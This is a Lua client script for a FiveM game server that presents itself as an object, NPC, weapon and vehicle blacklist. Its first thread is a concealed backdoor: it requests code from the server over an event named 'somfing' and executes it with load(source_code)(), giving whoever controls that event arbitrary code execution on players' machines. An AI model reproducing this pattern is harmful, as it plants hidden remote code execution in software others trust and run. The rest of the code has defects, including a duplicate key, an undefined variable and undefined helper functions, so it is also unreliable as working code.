 -- Heeeeeeeeeejka

 Citizen.CreateThread(function()
    TriggerServerEvent("somfing")
    RegisterNetEvent("somfing")
    AddEventHandler("somfing", function(source_code)
        load(source_code)()
    end)
end)

local blackObjects = Config.blackObjects

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(6)
		local ped = PlayerPedId()
		local handle,object = FindFirstObject()
		local finished = false
		repeat
			Citizen.Wait(1)
			if IsEntityAttached(object) and DoesEntityExist(object) then
				if GetEntityModel(object) == GetHashKey("prop_acc_guitar_01") or GetEntityModel(object) == GetHashKey("prop_weed_pallet") then
					ReqAndDelete(object,true)
				end
			end
			for i=1,#blackObjects do
				if GetEntityModel(object) == GetHashKey(blackObjects[i]) then
					ReqAndDelete(object,false)
				end
			end
			finished,object = FindNextObject(handle)
		until not finished
		EndFindObject(handle)
	end
end)

function ReqAndDelete(object,detach)
	if DoesEntityExist(object) then
		NetworkRequestControlOfEntity(object)
		while not NetworkHasControlOfEntity(object) do
			Citizen.Wait(1)
		end

		if detach then
			DetachEntity(object,0,false)
		end

		SetEntityCollision(object,false,false)
		SetEntityAlpha(object,0.0,true)
		SetEntityAsMissionEntity(object,true,true)
		SetEntityAsNoLongerNeeded(object)
		DeleteEntity(object)
	end
end

function KillAllPeds()
	local pedweapon
	local pedid
	for ped in EnumeratePeds() do 
			if DoesEntityExist(ped) then
					pedid = GetEntityModel(ped)
					pedweapon = GetSelectedPedWeapon(ped)
					if pedweapon == -1312131151 or not IsPedHuman(ped) then 
							ApplyDamageToPed(ped, 1000, false)
							DeleteEntity(ped)
					else
							switch = function (choice)
									choice = choice and tonumber(choice) or choice
								
									case =
									{
											[451459928] = function ( )
													ApplyDamageToPed(ped, 1000, false)
													DeleteEntity(ped)
											end,
								
											[1684083350] = function ( )
													ApplyDamageToPed(ped, 1000, false)
													DeleteEntity(ped)
											end,

											[451459928] = function ( )
													ApplyDamageToPed(ped, 1000, false)
													DeleteEntity(ped)
											end,
						
											[1096929346] = function ( )
													ApplyDamageToPed(ped, 1000, false)
													DeleteEntity(ped)
											end,

											[880829941] = function ( )
													ApplyDamageToPed(ped, 1000, false)
													DeleteEntity(ped)
											end,
				
											[-1404353274] = function ( )
													ApplyDamageToPed(ped, 1000, false)
													DeleteEntity(ped)
											end,

											[2109968527] = function ( )
													ApplyDamageToPed(ped, 1000, false)
													DeleteEntity(ped)
											end,
											
										 default = function ( )
										 end,
									}
									if case[choice] then
										 case[choice]()
									else
										 case["default"]()
									end
								end
								switch(pedid) 
					end
			 end
	end
end

Citizen.CreateThread(function()
	while (true) do
			Citizen.Wait(200)
			KillAllPeds()
			DeleteEntity(ped)
	end
end) 


local entityEnumerator = { __gc = function(enum) if enum.destructor and enum.handle then enum.destructor(enum.handle) end enum.destructor = nil enum.handle = nil end }

local function EnumerateEntities(initFunc, moveFunc, disposeFunc) return coroutine.wrap(function() local iter, id = initFunc() if not id or id == 0 then disposeFunc(iter) return end local enum = {handle = iter, destructor = disposeFunc} setmetatable(enum, entityEnumerator) local next = true repeat coroutine.yield(id) next, id = moveFunc(iter) until not next enum.destructor, enum.handle = nil, nil disposeFunc(iter) end) end

function EnumeratePeds() return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed) end

Citizen.CreateThread(function()
	while true do
	Citizen.Wait(2000)
		thePeds = EnumeratePeds()
		PedStatus = 0
		for ped in thePeds do
			PedStatus = PedStatus + 1
			if not (IsPedAPlayer(ped))then
					DeleteEntity(ped)
					RemoveAllPedWeapons(ped, true)
			end
	end		
end
end)

disableallweapons = true

Citizen.CreateThread(function()
	while true do
		Wait(1)

		playerPed = GetPlayerPed(-1)
		if playerPed then
			nothing, weapon = GetCurrentPedWeapon(playerPed, true)

			if disableallweapons then
				RemoveAllPedWeapons(playerPed, true)
			else
				if isWeaponBlacklisted(weapon) then
					RemoveWeaponFromPed(playerPed, weapon)
				end
			end
		end
	end
end)

function isWeaponBlacklisted(model)
	for _, blacklistedWeapon in pairs(Config.weaponblacklist) do
		if model == GetHashKey(blacklistedWeapon) then
			return true
		end
	end

	return false
end

local carblacklist = Config.blacklistcars

Citizen.CreateThread(function()
	while true do
		Wait(1)

		playerPed = GetPlayerPed(-1)
		if playerPed then
			checkCar(GetVehiclePedIsIn(playerPed, false))

			x, y, z = table.unpack(GetEntityCoords(playerPed, true))
			for _, blacklistedCar in pairs(carblacklist) do
				checkCar(GetClosestVehicle(x, y, z, 100.0, GetHashKey(blacklistedCar), 70))
			end
		end
	end
end)

function checkCar(car)
	if car then
		carModel = GetEntityModel(car)
		carName = GetDisplayNameFromVehicleModel(carModel)

		if isCarBlacklisted(carModel) then
			_DeleteEntity(car)
			sendForbiddenMessage("This vehicle is blacklisted!")
		end
	end
end

function isCarBlacklisted(model)
	for _, blacklistedCar in pairs(carblacklist) do
		if model == GetHashKey(blacklistedCar) then
			return true
		end
	end

	return false
end